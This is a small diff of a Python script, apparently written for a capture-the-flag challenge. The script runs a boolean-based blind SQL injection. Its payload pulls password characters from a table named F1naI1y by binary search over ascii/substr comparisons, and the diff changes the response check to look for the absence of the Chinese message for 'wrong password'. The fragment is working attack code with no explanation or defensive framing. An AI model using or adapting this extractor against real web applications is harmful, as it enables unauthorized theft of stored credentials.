@@ -19,7 +19,7 @@ while True:
         #payload = "(ascii(substr((select(group_concat(password))from(F1naI1y)),{0},1))>{1})".format(i,mid)
         response = requests.get(url+payload)
        #response = requests.get(url,data=payload)
-        if "Click" in response.text:
+        if "密码错误" not in response.text:
             head = mid + 1
         else:
             tail = mid 
